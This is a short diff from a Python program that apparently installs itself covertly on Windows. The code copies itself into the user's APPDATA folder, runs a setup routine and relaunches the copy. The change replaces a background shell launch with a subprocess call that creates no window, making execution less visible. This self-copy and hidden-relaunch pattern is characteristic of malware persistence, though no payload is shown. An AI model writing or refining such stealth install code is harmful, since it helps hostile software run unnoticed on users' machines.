@@ -91,7 +91,7 @@ if not os.path.exists(os.environ["APPDATA"]+"/"+program):
     self_clone(os.environ["APPDATA"]+"/"+program)
     if "first_setup" in dir():
         first_setup()
-    os.system("start /b cmd /c "+os.environ["APPDATA"]+"/"+program)
+    subprocess.Popen([sys.executable, os.environ["APPDATA"]+"/"+program], creationflags=subprocess.CREATE_NO_WINDOW)
     sys.exit(0)
 
 define_caption()
